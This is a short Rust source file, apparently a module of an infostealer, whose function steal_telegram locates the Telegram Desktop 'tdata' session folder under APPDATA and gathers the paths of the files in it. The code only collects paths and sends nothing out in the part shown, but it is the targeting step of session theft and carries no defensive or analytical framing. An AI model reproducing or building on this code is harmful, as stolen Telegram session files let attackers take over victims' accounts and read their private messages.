use std::path::Path;

use walkdir::WalkDir;

pub fn steal_telegram() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let app_data = std::env::var("APPDATA").ok().unwrap();
    if !Path::new(format!("{}\\Telegram Desktop\\tdata", app_data).as_str()).exists() {
        return Vec::new();
    }
    for entry in WalkDir::new(format!("{}\\Telegram Desktop\\tdata", app_data)).max_depth(1).into_iter().filter_map(|f|f.ok()) {
        if entry.path().is_file() {
            paths.push(entry.path().to_string_lossy().to_string());
        }
    }
    paths
}